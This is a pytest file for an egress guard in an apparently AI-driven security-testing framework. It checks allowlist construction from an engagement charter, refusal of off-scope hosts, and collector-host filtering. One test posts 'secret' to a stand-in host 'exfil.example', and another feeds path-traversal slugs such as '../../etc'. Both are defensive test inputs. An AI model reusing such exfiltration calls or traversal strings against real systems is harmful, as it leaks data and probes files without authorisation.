"""
Tests for agents.egress_guard.

The guard is the runtime backstop for sovereignty: even if a future
code change introduces an unexpected egress path, the guard refuses
it before bytes leave the host. These tests confirm the refusal
semantics under both sovereign and permissive modes, and the
allowlist construction from charter scope.
"""

from __future__ import annotations

from pathlib import Path

import httpx
import pytest

from framework.v2.agents.egress_guard import (
    EgressAllowlist,
    SovereignHttpxTransport,
    build_engagement_allowlist,
    provisioned_collector_hosts,
)
from framework.v2.common import paths as _paths
from framework.v2.common.errors import SovereigntyViolation
from framework.v2.kernel.sovereignty import SovereigntyPolicy, set_policy


_SIGNED_CHARTER = """\
# Engagement charter — `alpha`

## 1. Operator attestation
Signed: `tester`     Date: `2026-05-04`

## 2. In-scope systems

| Host | Notes | Auth |
|------|-------|------|
| `alpha.example` | Primary | Yes |
| `*.alpha.example` | Subdomains | Yes |
"""


@pytest.fixture()
def isolated_engagement(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> str:
    targets_root = tmp_path / "targets"
    targets_root.mkdir()
    (targets_root / "alpha").mkdir()
    (targets_root / "alpha" / "charter.md").write_text(
        _SIGNED_CHARTER, encoding="utf-8",
    )
    monkeypatch.setattr(_paths, "target_dir", lambda s: targets_root / s)
    monkeypatch.setattr(
        _paths, "charter_path",
        lambda s: targets_root / s / "charter.md",
    )
    return "alpha"


@pytest.fixture(autouse=True)
def _reset_policy():
    set_policy(None)
    yield
    set_policy(None)


# ---------------------------------------------------------------------------
# EgressAllowlist
# ---------------------------------------------------------------------------


def test_allowlist_default_permits_localhost():
    a = EgressAllowlist()
    assert a.permits("localhost")
    assert a.permits("127.0.0.1")
    assert a.permits("::1")


def test_allowlist_refuses_unknown_host_by_default():
    a = EgressAllowlist()
    assert not a.permits("api.anthropic.com")
    assert not a.permits("evil.example")


def test_allowlist_permits_target_hosts():
    a = EgressAllowlist(target_hosts=("alpha.example", "*.alpha.example"))
    assert a.permits("alpha.example")
    assert a.permits("api.alpha.example")
    assert not a.permits("evil.example")


def test_allowlist_extra_hosts():
    a = EgressAllowlist(extra_hosts=("internal-mirror.example",))
    assert a.permits("internal-mirror.example")


def test_build_engagement_allowlist_reads_charter_scope(isolated_engagement):
    a = build_engagement_allowlist(slug="alpha")
    assert a.permits("alpha.example")
    assert a.permits("api.alpha.example")
    assert not a.permits("api.anthropic.com")
    # Localhost is always permitted (LLM endpoint).
    assert a.permits("localhost")


def test_build_engagement_allowlist_handles_missing_charter(tmp_path, monkeypatch):
    monkeypatch.setattr(_paths, "target_dir", lambda s: tmp_path / "missing" / s)
    monkeypatch.setattr(
        _paths, "charter_path", lambda s: tmp_path / "missing" / s / "charter.md",
    )
    # No exception even when charter is absent — empty target list.
    a = build_engagement_allowlist(slug="ghost")
    assert not a.permits("anywhere.example")
    assert a.permits("localhost")


# ---------------------------------------------------------------------------
# SovereignHttpxTransport — sovereign mode
# ---------------------------------------------------------------------------


def _mock_inner_returning_204() -> httpx.MockTransport:
    return httpx.MockTransport(
        lambda request: httpx.Response(204, content=b""),
    )


def test_transport_refuses_off_allowlist_under_sovereign():
    set_policy(SovereigntyPolicy(strict=True))
    a = EgressAllowlist(target_hosts=("alpha.example",))
    transport = SovereignHttpxTransport(allowlist=a, inner=_mock_inner_returning_204())
    client = httpx.Client(transport=transport)
    with pytest.raises(SovereigntyViolation) as exc:
        client.get("https://api.anthropic.com/v1/messages")
    assert "api.anthropic.com" in str(exc.value)
    assert "sovereign" in str(exc.value).lower()
    client.close()


def test_transport_permits_in_scope_under_sovereign():
    set_policy(SovereigntyPolicy(strict=True))
    a = EgressAllowlist(target_hosts=("alpha.example",))
    transport = SovereignHttpxTransport(allowlist=a, inner=_mock_inner_returning_204())
    client = httpx.Client(transport=transport)
    response = client.get("https://alpha.example/users")
    assert response.status_code == 204
    client.close()


def test_transport_permits_localhost_under_sovereign():
    """Local LLM backends and the operator's own infrastructure both
    use localhost; the guard must not refuse them."""
    set_policy(SovereigntyPolicy(strict=True))
    a = EgressAllowlist()
    transport = SovereignHttpxTransport(allowlist=a, inner=_mock_inner_returning_204())
    client = httpx.Client(transport=transport)
    response = client.get("http://localhost:11434/api/tags")
    assert response.status_code == 204
    client.close()


def test_transport_permissive_mode_does_not_refuse():
    """In permissive mode the guard logs but does not refuse —
    development workflows that hit docs/mirrors should not break."""
    set_policy(SovereigntyPolicy(strict=False))
    a = EgressAllowlist(target_hosts=("alpha.example",))
    transport = SovereignHttpxTransport(allowlist=a, inner=_mock_inner_returning_204())
    client = httpx.Client(transport=transport)
    # api.anthropic.com is off-allowlist, but permissive guard lets it through.
    response = client.get("https://api.anthropic.com/v1/messages")
    assert response.status_code == 204
    client.close()


def test_transport_with_sovereign_only_false_always_enforces():
    """Setting sovereign_only=False (mistake-resistant flag) makes the
    guard fire even in permissive mode — for ops that always want
    enforcement."""
    set_policy(SovereigntyPolicy(strict=False))
    a = EgressAllowlist(target_hosts=("alpha.example",))
    transport = SovereignHttpxTransport(
        allowlist=a, inner=_mock_inner_returning_204(),
        sovereign_only=False,
    )
    client = httpx.Client(transport=transport)
    with pytest.raises(SovereigntyViolation):
        client.get("https://api.anthropic.com/v1/messages")
    client.close()


def test_transport_close_propagates_to_inner():
    a = EgressAllowlist()
    inner = _mock_inner_returning_204()
    transport = SovereignHttpxTransport(allowlist=a, inner=inner)
    transport.close()
    # MockTransport has no close-tracking; we just confirm no exception.


def test_transport_refusal_message_includes_url_and_allowlist():
    set_policy(SovereigntyPolicy(strict=True))
    a = EgressAllowlist(
        target_hosts=("alpha.example",),
        extra_hosts=("internal-mirror.example",),
    )
    transport = SovereignHttpxTransport(allowlist=a, inner=_mock_inner_returning_204())
    client = httpx.Client(transport=transport)
    with pytest.raises(SovereigntyViolation) as exc:
        client.post("https://exfil.example/upload", content=b"secret")
    msg = str(exc.value)
    # The message must show what was attempted, what's allowed, and how
    # to remediate. Sovereign reviewers debug from these lines.
    assert "exfil.example" in msg
    assert "POST" in msg
    assert "alpha.example" in msg  # allowlist visible
    assert "internal-mirror.example" in msg
    client.close()


# ---------------------------------------------------------------------------
# C1 — live-collection egress: collector_hosts provisioning + third-party disjointness
# ---------------------------------------------------------------------------


def test_collector_hosts_empty_by_default(isolated_engagement):
    # no file, no explicit arg → NO collector egress is widened (fail-closed; unchanged behaviour)
    a = build_engagement_allowlist(slug="alpha")
    assert a.collector_hosts == ()
    assert not a.permits("sts.amazonaws.com")


def test_explicit_disjoint_collector_hosts_are_permitted(isolated_engagement):
    a = build_engagement_allowlist(slug="alpha", collector_hosts=["sts.amazonaws.com", "*.googleapis.com"])
    assert a.permits("sts.amazonaws.com") and a.permits("iam.googleapis.com")   # collector control planes
    assert a.permits("alpha.example")            # the target scope still works
    assert not a.permits("evil.example")         # nothing else widened


def test_collector_hosts_overlapping_target_scope_are_dropped(isolated_engagement):
    # a "collector" host inside the engagement's attack scope is REFUSED as a collector (third-party-disjoint
    # doctrine) — it must not be laundered onto the collector axis.
    a = build_engagement_allowlist(slug="alpha", collector_hosts=["api.alpha.example", "sts.amazonaws.com"])
    assert "api.alpha.example" not in a.collector_hosts     # dropped (covered by *.alpha.example scope)
    assert "sts.amazonaws.com" in a.collector_hosts         # the genuinely third-party one survives


def test_provisioned_collector_hosts_file_is_read(isolated_engagement, monkeypatch):
    import framework.v2.common.paths as P
    (P.target_dir("alpha") / "collector-hosts.txt").write_text(
        "# operator-provisioned live-collection control planes\nsts.amazonaws.com\n\n*.googleapis.com\n",
        encoding="utf-8")
    assert provisioned_collector_hosts("alpha") == ("sts.amazonaws.com", "*.googleapis.com")   # comment/blank stripped
    a = build_engagement_allowlist(slug="alpha")            # picked up automatically
    assert a.permits("sts.amazonaws.com") and a.permits("compute.googleapis.com")


def test_provisioned_absent_or_overlapping_is_fail_closed(isolated_engagement, monkeypatch):
    import framework.v2.common.paths as P
    assert provisioned_collector_hosts("nope") == ()        # absent file → empty (fail-closed)
    (P.target_dir("alpha") / "collector-hosts.txt").write_text("*.alpha.example\n", encoding="utf-8")
    a = build_engagement_allowlist(slug="alpha")            # a provisioned host overlapping scope is dropped
    assert "*.alpha.example" not in a.collector_hosts


def test_overbroad_collector_hosts_are_dropped(isolated_engagement):
    # H1: a whole-TLD / public-suffix / bare-* collector host is an exfil footgun → refused, even though it
    # doesn't overlap the specific target scope. A concrete apex or a ≥2-private-label wildcard is fine.
    a = build_engagement_allowlist(slug="alpha", collector_hosts=[
        "*.com", "*.io", "*.internal", "*.co.uk", "*", "*.*",           # too broad → dropped
        "*.amazonaws.com", "sts.us-east-1.amazonaws.com",               # legitimately narrow → kept
    ])
    assert a.collector_hosts == ("*.amazonaws.com", "sts.us-east-1.amazonaws.com")
    assert not a.permits("evil.com") and not a.permits("evil.co.uk")    # the TLD hole is closed
    assert a.permits("iam.amazonaws.com") and a.permits("sts.us-east-1.amazonaws.com")


def test_provisioned_collector_hosts_rejects_traversal_slug():
    # H2: a crafted slug can never read a collector-hosts file outside targets/<slug>/
    for bad in ("../secret", "../../etc", "/etc", "a/b", "a\\b", ".hidden", "c:stuff"):
        assert provisioned_collector_hosts(bad) == ()
